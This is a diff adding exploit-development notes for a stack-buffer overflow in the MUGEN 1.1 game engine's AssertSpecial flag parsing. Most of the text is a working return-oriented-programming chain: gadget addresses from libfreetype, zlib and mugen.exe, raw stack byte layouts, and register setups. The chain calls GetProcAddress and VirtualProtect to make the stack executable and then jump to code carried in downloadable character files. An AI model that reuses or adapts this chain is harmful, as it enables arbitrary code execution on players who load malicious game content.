@@ -1,0 +1,307 @@
+AssertSpecial Flag parameter has a stack smash exploit. we can ROP into arbitrary code execution.
+unfortunately there is NO easy-access VirtualAlloc in 1.1 compared to an available ptr from glew32.dll in 1.0. therefore, we need to build it from the ground up.
+
+This can be done with 2x API calls in a long chain - one to GetProcAddress to get VirtualProtect addr, one to VirtualProtect itself
+
+additionally, the flag field is 64 bytes long. == not very easy to use.
+Since it's supernull (runs at parse time), we can just corrupt the entire statedef loading portion of the stack and drop out. This gives more space.
+Another issue is that all bytes get converted to lowercase by parser. so 0x41 ~ 0x5A are unusable. additionally 0x20 is unusable.
+This means it's much better to just springboard this to load raw code from a file, maybe one already in memory. VirtualProtect the stack, then ideally SetProcessDEPPolicy the binary and jump.
+
+GOAL: SetProcessDEPPolicy to allow execution from AI file. (Or really whatever file is available)
+
+goal 1: get VirtualProtect function address 
+--> get KERNEL32 module handle
+--> generate a VirtualProtect string.
+—> get GetProcAddress ptr
+—> execute GetProcAddress
+step 2: execute VirtualProtect 
+--> same basic structure as executing GetProcAddress, maybe a bit easier
+—> moves us to the stack
+step 3: move out of original supernull zone due to the restrictions on bytes.
+—> ideally, jump to the AI file, SND file, or other. As these are less restricted. Worst case, jump to the location of the loaded file with code past the SN zone
+
+0x10008044 == KERNEL32 handle, but hard to access due to the 00. need goofy addtn.
+ptr to GetProcAddress exists at 0x004DE030 (in MUGEN exe) - need to have a ptr reading func
+need to manually construct VirtualProtect string - write close to 5040e8 and clean up after
+
+====== STEP 1 ======
+
+Path to execution:
+- Load registers
+- Exec either a ‘push esi, ret’ or a ‘push ebp, ret’ or a ‘jump esi’ or a ‘jump ebp’
+--> purpose is to allow a jump to an arbitrary addr loaded into one of these registers.
+--> very important as some gadgets exist in mugen or in pthreadVC2 and are otherwise hard to execute due to bad bytes.
+--> 0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+- Reg jumped to will point to pushad gadget
+--> 0x0048b07b :  # PUSHAD # RETN    ** [mugen.exe] **   |  startnull {PAGE_EXECUTE_READ}
+- EDI will contain a stack pivot for add ESP,0c to drop to EBX
+--> 0x67b811b9 : {pivot 12 / 0x0c} :  # POP EAX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+- EBX,EDX,ECX,EAC used in running function
+
+Stack contents for PUSHAD:
+EDI <— stack pivot + 0x10
+ESI <— Invoker (gadget in MUGEN for PUSHAD)
+EBP
+ESP
+EBX
+EDX <— target for pivot, GetProcAddress (DONE)
+ECX <— return addr
+EAX <— hModule == KERNEL32 HANDLE (DONE)
+Stack <— lpProcName == 0x67BD0210 (hardcoded to writeable space in non-rebase DLL libfreetype)
+
+=== PREP: write string data to 0x67BD0210 - does not matter what this destroys as the final addr is hardcoded ===
+== bytes for VirtualProtect: 56 69 72 74 75 61 6C 50 72 6F 74 65 63 74
+== get 0x67BD0210 into EDX
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set edx=0x67BD0210
+
+== write "Virt"
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => 0x747268C2
+0x67bc2cf7 (RVA : 0x00042cf7) : # ADD EAX,94 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => "Virt"
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> write out
+
+== increase edx by 3
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+== write "tual"
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => 0x6C617574 => "tual" (overlap 1 char to simplify next)
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> write out
+
+== increase edx by 4
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+== write "Prot"
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => 0x746F71BC
+0x67bc2cf7 (RVA : 0x00042cf7) : # ADD EAX,94 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => "Prot"
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> write out
+
+== increase edx by 3
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+== write "tect"
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> eax => 0x74656374 => "tect" (overlap 1 char to simplify null)
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> write out
+
+=== ESI <- 0x0048B07B (trashes eax, ebp, ebx, ecx and requires writeable ptr in ebx) ===
+pop eax
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+--> set eax=0x2D1D2D72
+pop esi
+0x67ba8092 :  # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set esi=0xd32b8309
+add eax to esi
+0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set esi=0x0048b07b
+--> careful: set ebx=0x67BD0210 to not crash
+
+=== EAX <- KERNEL32 handle [0x10008044] (trashes ebx) ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x0FFF8027
+0x67b9363f (RVA : 0x0001363f) : # ADD EAX,1000D # ADD DH,DH # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+- eval the ptr
+0x67bc90cc :  # MOV EBX,DWORD PTR DS:[EAX+10] # ADD ESP,14 # MOV EAX,EBX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EDI <-> EAX for safekeeping while EAX is trashed ===
+0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EDX <- GetProcAddress function pointer [0x004DE030] (trashes eax, ebx, ebp) ===
+steps involved:
+- get 0x004DE030 into a register
+pop edx
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set edx=0xE2E2F2B2
+pop eax
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+--> set eax=0x1D6AED6E
+add edx -> eax
+0x67bb13df (RVA : 0x000313df) : # ADD EAX,EDX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> sets eax=0x004DE020 (ptr to GetProcAddress - 0x10)
+- eval the ptr
+0x67bc90cc :  # MOV EBX,DWORD PTR DS:[EAX+10] # ADD ESP,14 # MOV EAX,EBX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+- eax <=> ebp
+0x62e838ce (RVA : 0x000038ce) : # XCHG EAX,EBP # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+ebp => edx
+0x67bbd0bd (RVA : 0x0003d0bd) : # PUSH EBP # MOV EAX,8B04468B # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+C3 D0 BB 67 <-- POP EDX
+B2 F2 E2 E2 <-- EDX
+02 1C B8 67 <-- POP EAX
+6E ED 6A 1D <-- EAX
+DF 13 BB 67 <-- ADD EDX TO EAX => getprocaddress ptr - 0x10
+FF FF FF FF <-- EBX
+FF FF FF FF <-- EBP
+CC 90 BC 67 <-- PICKUP PTR INTO EAX
+FF FF FF FF <-- SPACING
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF
+FF FF FF FF <-- EBX
+FF FF FF FF <-- EBP
+CE 38 E8 62 <-- EAX <=> EBP
+BD D0 BB 67 <-- EBP -> EDX
+
+=== ECX <- return address  (trashes ebx, ebp) ===
+0x67b8fc01 (RVA : 0x0000fc01) : # POP ECX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+FF FF FF FF <— should be the first gadget for executing VirtualProtect
+FF FF FF FF
+FF FF FF FF
+
+=== EAX <- EDI from before (just restores) ===
+0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EDI <- Pivot 0x62E8C739 (trashes ebp) ===
+Pivot = 0x62e8c739 : {pivot 16 / 0x10} :  # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+FB 77 B8 67
+FF FF FF FF
+
+=== Invoke ESI ===
+0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+==> at this point ESI contains the addr of the PUSHAD gadget.
+
+Aftermath: EAX=[VirtualProtect]
+
+====== CONCEPTUAL ESP->EBX STEPS =====
+1. Trigger PUSHAD via ESI call
+2. Stack looks like:
+
+EDI
+ESI
+EBP
+ESP
+EBX
+EDX
+ECX
+EAX
+
+3. Pop 2x and ret from EBP to a POP EBX instr
+4. ESP then pops into EBX
+
+This is quite cross applicable. In a sense this gives us a MOV EXX,EYY for any values of EXX/EYY aside from EDI, given enough POP gadget variety.
+
+====== STEP 2 ======
+
+Followup is to execute VProtect to enable stack code execution. Basically the same setup as the GetProcAddress with different reg values. bit beefier/harder.
+
+EDI <— stack pivot (0x67BCD813) (DONE)
+ESI <- Invoker (DONE)
+EBP <— VirtualProtect addr (DONE)
+ESP <— ret addr (DONE)
+EBX <— lpAddress (DONE)
+EDX <— dwSize (DONE)
+ECX <— flNewProtect (DONE)
+EAX <— lpflOldProtect
+Base
+
+Requirements:
+EDI pivot: 0x67B811BB
+ESI: 0x0048b07b
+EBP: VProt addr
+ESP untouched
+EBX: any addr before ESP
+EDX: 0x400
+ECX: 0x40
+EAX: 0x67BD0228
+
+
+worked with these in testing:
+50 E7 19 00 <-- ret/ESP
+(slightly less than ESP) <-- lpAddress/EBX
+00 04 00 00 <-- dwSize/EDX
+40 00 00 00 <-- flNewProtect/ECX
+28 02 BD 67 <-- lpflOldProtect/EAX
+--> execution starts here
+
+=== PREP: Preserve EAX in writeable memory 0x67BD0324 ===
+== preserve EAX
+0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+== get 0x67BD0224 into EDX
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+24 03 BD 67
+== restore EAX
+0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+== put EAX into writeable memory
+0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== ESI <- 0x0048B07B (trashes eax, ebp, ebx, ecx and requires writeable ptr in ebx) ===
+pop eax
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+--> set eax=0x2D1D2D72
+pop esi
+0x67ba8092 :  # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set esi=0xd32b8309
+add eax to esi
+0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+--> set esi=0x0048b07b
+--> careful: set ebx=0x67BD0210 to not crash
+
+=== EBX <- old ESP (trashes EBP, EDI, ESI) AND ECX <- 0x40 flNewProtect ===
+EDI must contain: 0x67BA8092 :  # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+EBP must contain: 0x67b90484 :  # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+EDX must contain: 0x67BBD0C6 :  # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+ECX must contain: 0x62e89a66 :  # POP ECX # OR DH,DH # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
+=> Load EDI and EBP
+0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C0 02 B9 67
+84 04 B9 67
+=> Load EDX
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C6 D0 BB 67
+=> Load ECX
+0x67b8fc01 :  # POP ECX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+66 9A E8 62
+FF FF FF FF
+84 04 B9 67
+=> Load EAX with 0x40 to store into ECX
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+C8 FF FF FF
+0x67bc2ce7 (RVA : 0x00042ce7) : # ADD EAX,78 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+=> Invoke ESI for PUSHAD
+0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EDX <- 0x400 dwSize ===
+0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+FF FF 83 FF
+0x67ba26ac :  # ADD EDX,8000 # POP EBP # MOV EAX,EDX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+FF FF FF FF
+0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EDI <- Pivot (0x67BCD813) ===
+0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+13 D8 BC 67
+FF FF FF FF
+
+=== EBP <- [0x67BD0224] ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+BC 01 BD 67
+0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+0x67ba12b6 (RVA : 0x000212b6) : # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+=== EAX <- lpflOldProtect (0x67BD0228) ===
+0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
+28 02 BD 67
+
+=== Invoke ESI ===
+0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
+
+####### Independent eax pickup ptr:
+0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
